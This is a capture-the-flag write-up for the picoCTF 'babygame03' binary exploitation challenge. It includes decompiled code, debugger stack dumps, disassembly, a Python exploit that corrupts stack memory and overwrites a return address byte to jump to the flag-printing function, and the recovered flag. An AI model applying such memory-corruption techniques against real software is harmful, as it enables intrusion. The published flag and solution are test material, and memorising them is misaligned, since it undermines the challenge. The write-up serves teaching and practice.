# babygame03:Binary Exploitation:400pts
Break the game and get the flag.  
Welcome to BabyGame 03! Navigate around the map and see what you can find! Be careful, you don't have many moves. There are obstacles that instantly end the game on collision. The game is available to download [here](game). There is no source available, so you'll have to figure your way around the map.  
You can connect with it using `nc rhea.picoctf.net 51791`.  

Hints  
1  
Use 'w','a','s','d' to move around.  
2  
There may be secret commands to make your life easy.  

# Solution
Only the binary and the destination are passed. 
When connected, it seems that the game can be moved by 'wasd', where '@' is the player, '#' is the instant death square, and 'X' is the goal. 
The '#' is located at the top left of the map, and the 'X' is placed at the bottom right of the map.
```bash
$ nc rhea.picoctf.net 51791

Player position: 4 4
Level: 1
End tile position: 29 89
Lives left: 50
#.........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
....@.....................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
.........................................................................................X
```
If you go out from the left or right side of the stage, you will see that you will move to the opposite of the upper and lower rows. 
In other words, the left and right sides are connected, the left is connected to the end of the upper line, and the right is connected to the beginning of the lower line. 
The starting position is coordinated (5,5) and you can only move 50 times, so you can reach the upper left and die instantly, but you cannot finish at the bottom right. 
For the time being, decompile the binaries with IDA. 
The 'main' was as follows:
```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char v3; // al
  int v5; // [esp+0h] [ebp-AACh] BYREF
  int v6; // [esp+4h] [ebp-AA8h] BYREF
  int v7; // [esp+8h] [ebp-AA4h]
  char v8[2700]; // [esp+13h] [ebp-A99h] BYREF
  int v9; // [esp+AA0h] [ebp-Ch]
  int *p_argc; // [esp+AA4h] [ebp-8h]

  p_argc = &argc;
  init_player(&v6);
  v5 = 1;
  v9 = 0;
  init_map(v8, &v6, &v5);
  print_map(v8, &v6, &v5);
  signal(2, sigint_handler);
  do
  {
    v3 = getchar(p_argc);
    move_player(&v6, v3, v8, &v5);
    print_map(v8, &v6, &v5);
    if ( v6 == 29 && v7 == 89 && v5 != 4 )
    {
      puts("You win!\n Next level starting ");
      ++v9;
      ++v5;
      init_player(&v6);
      init_map(v8, &v6, &v5);
    }
  }
  while ( v6 != 29 || v7 != 89 || v5 != 5 || v9 != 4 );
  win(&v5);
  return 0;
}
```
The map data is implemented as a single array with 'v8 ', and the current level 'v5', the user's coordinates and remaining movement times 'v6, v7', and the previous level 'v9' are defined before and after. 
Once all are cleared, the following 'win' seems to be called.
```c
int __cdecl win(int *a1)
{
  int result; // eax
  int v2; // [esp-Ch] [ebp-54h]
  int v3; // [esp-8h] [ebp-50h]
  int v4; // [esp-4h] [ebp-4Ch]
  char v5[60]; // [esp+0h] [ebp-48h] BYREF
  int v6; // [esp+3Ch] [ebp-Ch]

  v6 = fopen("flag.txt", "r");
  if ( !v6 )
  {
    puts("Please create 'flag.txt' in this directory with your own debugging flag.");
    fflush(stdout);
    exit(0, v2, v3, v4);
  }
  fgets(v5, 60, v6);
  result = *a1;
  if ( *a1 == 5 )
  {
    printf(v5);
    return fflush(stdout);
  }
  return result;
}
```
It only shows flags when the level is 5, so you can't use cheats that suddenly call 'win' (although you can't call it in the first place). 
Next, look at the 'move_player', which controls the player's movement.  
```c
_DWORD *__cdecl move_player(_DWORD *a1, char a2, int a3, int a4)
{
  _DWORD *result; // eax
  int v5; // [esp-Ch] [ebp-24h]
  int v6; // [esp-8h] [ebp-20h]
  int v7; // [esp-4h] [ebp-1Ch]

  if ( (int)a1[2] <= 0 )
  {
    puts("No more lives left. Game over!");
    fflush(stdout);
    exit(0, v5, v6, v7);
  }
  if ( a2 == 108 )
    player_tile = getchar();
  if ( a2 == 112 )
    solve_round(a3, a1, a4);
  *(_BYTE *)(a1[1] + a3 + 90 * *a1) = 46;
  switch ( a2 )
  {
    case 'w':
      --*a1;
      break;
    case 's':
      ++*a1;
      break;
    case 'a':
      --a1[1];
      break;
    case 'd':
      ++a1[1];
      break;
  }
  if ( *(_BYTE *)(a1[1] + a3 + 90 * *a1) == 35 )
  {
    puts("You hit an obstacle!");
    fflush(stdout);
    exit(0, v5, v6, v7);
  }
  *(_BYTE *)(a1[1] + a3 + 90 * *a1) = player_tile;
  result = a1;
  --a1[2];
  return result;
}
```
`wasd`Change the player's display to other than`l`(`f ( a2 == 108 )`)and automatically go to the goal`p`(`if ( a2 == 112 )`) There seems to be a command.  
So, it's not enough to keep using 'p', but you'll run out of moves and die. 
Here, we notice that if the player goes out of the top and bottom of the map, they can access the memory before and after the map array. 
Also, the squares after the player moves are always rewritten as '.'('0x2e'). 
Why don't you take advantage of this to destroy and increase the number of moves? I'm trying manually and it breaks fine with 'aaaaawwwaaaaws'. 
When I put a breakpoint on 'move_player', the stack around the map data was rewritten as follows.  
Before the move 
```
3b:00ec│+074 0xffffc39c ◂— 0x1
3c:00f0│+078 0xffffc3a0 ◂— 0x1
3d:00f4│+07c 0xffffc3a4 ◂— 0xfffffffb
3e:00f8│+080 0xffffc3a8 ◂— 0x25 /* '%' */
3f:00fc│+084 0xffffc3ac ◂— 0x23000000
40:0100│+088 0xffffc3b0 ◂— 0x2e2e2e2e ('....')
```
After the move 
```
3b:00ec│+074 0xffffc39c ◂— 0x1
3c:00f0│+078 0xffffc3a0 ◂— 0x1
3d:00f4│+07c 0xffffc3a4 ◂— 0xfffffffb
3e:00f8│+080 0xffffc3a8 ◂— 0x2e0021 /* '!' */
3f:00fc│+084 0xffffc3ac ◂— 0x23000000
40:0100│+088 0xffffc3b0 ◂— 0x2e2e2e2e ('....')
```
'0x25' is now '0x2e0021'. 
Now you can use 'p' to reach the goal. 
Note: If you suddenly use 'p', you will pass through an instant death square, so move to a safe place like 'aaaaawwwaaaawsdddd' and use 'p'. 
I think I can call it a 'win' with this, but it gets stuck at level 4. 
If you look closely at 'main', you will see that you cannot reach level 4 to level 5 by the following comparison.  
```c
~~~
    print_map(v8, &v6, &v5);
    if ( v6 == 29 && v7 == 89 && v5 != 4 )
    {
      puts("You win!\n Next level starting ");
      ++v9;
      ++v5;
~~~
```
You can use the same technique as when you increase the number of moves to move to the level area in memory, and use 'l' to temporarily set the player display to '\x04' and enter any level. 
In order to get out of the loop and reach 'win', the current level must be 5 and the previous level must be 4. 
If you leave that place, it will be rewritten as '.'('0x2e'), and you will be at a ridiculous level, so you can only meet the conditions of either the current level or the previous level.  
```c
~~~
  }
  }
  while ( v6 != 29 || v7 != 89 || v5 != 5 || v9 != 4 );
  win(&v5);
~~~
```
I wonder if I can somehow break through the comparison when the current level is 4. 
Here, you notice that you can jump to another place in 'main' by moving the player to the last byte of the return address somewhere on the stack and changing the player display with 'l'. 
I want to jump to the place where I finished the comparison, so I look for a place to jump to.  
```bash
$ checksec --file=./game
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE
Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   60 Symbols        No    0               2               ./game
$ objdump -D ./game

./game:     file format elf32-i386
~~~
08049871 <main>:
~~~
 8049947:       e8 07 fb ff ff          call   8049453 <print_map>
 804994c:       83 c4 10                add    $0x10,%esp
 804994f:       8b 85 58 f5 ff ff       mov    -0xaa8(%ebp),%eax
 8049955:       83 f8 1d                cmp    $0x1d,%eax
 8049958:       75 6d                   jne    80499c7 <main+0x156>
 804995a:       8b 85 5c f5 ff ff       mov    -0xaa4(%ebp),%eax
 8049960:       83 f8 59                cmp    $0x59,%eax
 8049963:       75 62                   jne    80499c7 <main+0x156>
 8049965:       8b 85 54 f5 ff ff       mov    -0xaac(%ebp),%eax
 804996b:       83 f8 04                cmp    $0x4,%eax
 804996e:       74 57                   je     80499c7 <main+0x156>
 8049970:       83 ec 0c                sub    $0xc,%esp
 8049973:       8d 83 e8 e0 ff ff       lea    -0x1f18(%ebx),%eax
 8049979:       50                      push   %eax
 804997a:       e8 31 f7 ff ff          call   80490b0 <puts@plt>
 804997f:       83 c4 10                add    $0x10,%esp
 8049982:       83 45 f4 01             addl   $0x1,-0xc(%ebp)
 8049986:       8b 85 54 f5 ff ff       mov    -0xaac(%ebp),%eax
 804998c:       83 c0 01                add    $0x1,%eax
 804998f:       89 85 54 f5 ff ff       mov    %eax,-0xaac(%ebp)
 8049995:       83 ec 0c                sub    $0xc,%esp
 8049998:       8d 85 58 f5 ff ff       lea    -0xaa8(%ebp),%eax
 804999e:       50                      push   %eax
 804999f:       e8 62 fb ff ff          call   8049506 <init_player>
~~~
```
It seems that it is good to jump to '0x8049970', so all you have to do is look for the return address of '0x80499XX' on the stack. 
Note that the program will crash when moving outside the map because it moves while rewriting the memory to '.'('0x2e'). 
It is better to move down one line of the place you want to rewrite on the map, and pinpoint it at the end with 'w'. 
Imagine moving to the end of the address with 'aaaaawwwaaaawsddddaaw' and going up by 8 bytes. 
I made a breakpoint in 'move_player' and looked at the stack and it was as follows.  
```
00:0000│ esp 0xffffc37c —▸ 0x804992c (main+187) ◂— add esp, 0x10
01:0004│-ac8 0xffffc380 —▸ 0xffffc3a0 ◂— 0x0
02:0008│-ac4 0xffffc384 ◂— 0x77 /* 'w' */
03:000c│-ac0 0xffffc388 —▸ 0xffffc3af ◂— 0x2e2e2e2e ('....')
04:0010│-abc 0xffffc38c —▸ 0xffffc39c ◂— 0x4
05:0014│-ab8 0xffffc390 —▸ 0xf7fbe480 ◂— '/lib/i386-linux-gnu/libc.so.6'
06:0018│-ab4 0xffffc394 —▸ 0xffffcf10 ◂— 0x1
07:001c│-ab0 0xffffc398 ◂— 0x0
08:0020│-aac 0xffffc39c ◂— 0x4
09:0024│ eax 0xffffc3a0 ◂— 0x0
0a:0028│-aa4 0xffffc3a4 ◂— 0xfffffffd
0b:002c│-aa0 0xffffc3a8 ◂— 0x2e001b
0c:0030│-a9c 0xffffc3ac ◂— 0x2e000040 /* '@' */
0d:0034│-a98 0xffffc3b0 ◂— 0x2e2e2e2e ('....')
```
Since we want to rewrite the '0xffffc37f', we just need to move it up 4 * 12 bytes. 
This satisfies the condition that the current level is 5 and the previous level is 4. 
If you use 'p' after that, you can go to 'win', but the level will keep going up forever. 
I can't help it, so I use the same technique as before and jump to the place where I call 'win' in 'main'.
```bash
$ objdump -D ./game

./game:     file format elf32-i386
~~~
08049871 <main>:
~~~
 80499c4:       83 c4 10                add    $0x10,%esp
 80499c7:       8b 85 58 f5 ff ff       mov    -0xaa8(%ebp),%eax
 80499cd:       83 f8 1d                cmp    $0x1d,%eax
 80499d0:       0f 85 2f ff ff ff       jne    8049905 <main+0x94>
 80499d6:       8b 85 5c f5 ff ff       mov    -0xaa4(%ebp),%eax
 80499dc:       83 f8 59                cmp    $0x59,%eax
 80499df:       0f 85 20 ff ff ff       jne    8049905 <main+0x94>
 80499e5:       8b 85 54 f5 ff ff       mov    -0xaac(%ebp),%eax
 80499eb:       83 f8 05                cmp    $0x5,%eax
 80499ee:       0f 85 11 ff ff ff       jne    8049905 <main+0x94>
 80499f4:       83 7d f4 04             cmpl   $0x4,-0xc(%ebp)
 80499f8:       0f 85 07 ff ff ff       jne    8049905 <main+0x94>
 80499fe:       83 ec 0c                sub    $0xc,%esp
 8049a01:       8d 85 54 f5 ff ff       lea    -0xaac(%ebp),%eax
 8049a07:       50                      push   %eax
 8049a08:       e8 af fd ff ff          call   80497bc <win>
~~~
```
It's the last minute, but you can jump to '0x80499fe'. 
Note that the return address is 4 * 16 bytes, but it can be specified by the same procedure. Do it all with the following exploit.py:  
```python
from ptrlib import *

elf = ELF("./game")
# sock = Process("./game")
sock = Socket("nc rhea.picoctf.net 51791")

sock.sendline("aaaaawwwaaaawsddddp") # -> level 2
sock.sendline("aaaaawwwaaaawsddddp") # -> level 3
sock.sendline("aaaaawwwaaaawsddddp") # -> level 4
sock.sendline("aaaaawwwaaaawsddddaa" + ("aaaa" * 12) + "l\x70w") # -> level 5
sock.sendline("aaaaawwwaaaawsddddaa" + ("aaaa" * 16) + "l\xfew") # -> win

sock.sh()
```
Execute.  
```bash
$ python exploit.py
[+] __init__: Successfully connected to rhea.picoctf.net:51791
~~~
..........................................................................................
.........................................................................................X
picoCTF{gamer_leveluP_5a39c266}
```
flag was displayed.
## picoCTF{gamer_leveluP_5a39c266}